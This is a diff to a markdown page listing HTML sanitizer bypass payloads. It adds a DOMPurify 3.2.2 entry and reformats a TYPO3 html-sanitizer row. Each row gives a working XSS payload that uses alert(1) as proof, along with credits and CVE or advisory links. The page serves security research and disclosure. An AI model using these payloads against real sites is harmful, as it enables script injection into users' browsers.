@@ -18,6 +18,7 @@ This page contains some examples of payloads used to bypass sanitizers in the pa
 | 3.1.0   | ```n = 506; var payload = `${"<div>".repeat(n)}<table id="outer"><caption id="outer"><svg><desc><table id="inner"><caption id="inner"></caption></table></desc><style><a title="</style><img src onerror=alert(1)>"></a></style></svg></caption></table>${"</div>".repeat(n)}`;``` | [icesfont](https://github.com/icesfont) | N/A |
 | 3.1.7   | `<svg><a><foreignobject><a><table><a></table><style><!--</style></svg><a id="-><img src onerror=alert(1)>">.` | Masato Kinugawa [@kinugawamasato](https://twitter.com/kinugawamasato) | <https://x.com/kinugawamasato/status/1843687909431582830> |
 | 3.2.1   | `<math><foo-test><mi><li><table><foo-test><li></li></foo-test>a<a><style><!--</style>a<foo-bar is="--><img src=x onerror=alert(1)>">` | Yaniv Nizry [@YNizry](https://twitter.com/YNizry) | <https://yaniv-git.github.io/2024/12/08/DOMPurify%203.2.1%20Bypass%20(Non-Default%20Config)/> |
+| 3.2.2   | `<math><foo-test><mi><li><table><foo-test><li></li></foo-test><a><style><! \${</style>}<foo-b id="><img src onerror='alert(1)'>">hmm...</foo-b></a></table></li></mi></foo-test></math>` | Sean Ng [@ensyzip](https://x.com/ensyzip) | <https://ensy.zip/posts/dompurify-323-bypass/> |
 
 ## Mozilla Bleach
 
@@ -37,6 +38,6 @@ This page contains some examples of payloads used to bypass sanitizers in the pa
 
 | Version | Payload                                                                      | Credit              | Additional links                                                          |
 |---------|------------------------------------------------------------------------------|---------------------|---------------------------------------------------------------------------|
-| 2.0.15   |  `<!--a foo=--!><img src=x onerror=alert(1)><!--<a>">` | David Klein [@ncd_leeN](https://twitter.com/ncd_leeN) | [CVE-2022-36020](https://github.com/TYPO3/html-sanitizer/security/advisories/GHSA-47m6-46mj-p235) |
+| 2.0.15   | `<!--a foo=--!><img src=x onerror=alert(1)><!--<a>">` | David Klein [@ncd_leeN](https://twitter.com/ncd_leeN) | [CVE-2022-36020](https://github.com/TYPO3/html-sanitizer/security/advisories/GHSA-47m6-46mj-p235) |
 | 2.0.16   | `<![CDATA[<math><img src=x onerror=alert(1)>]]>`     | David Klein [@ncd_leeN](https://twitter.com/ncd_leeN) | [CVE-2022-23499](https://github.com/TYPO3/html-sanitizer/security/advisories/GHSA-hvwx-qh2h-xcfj) |
 
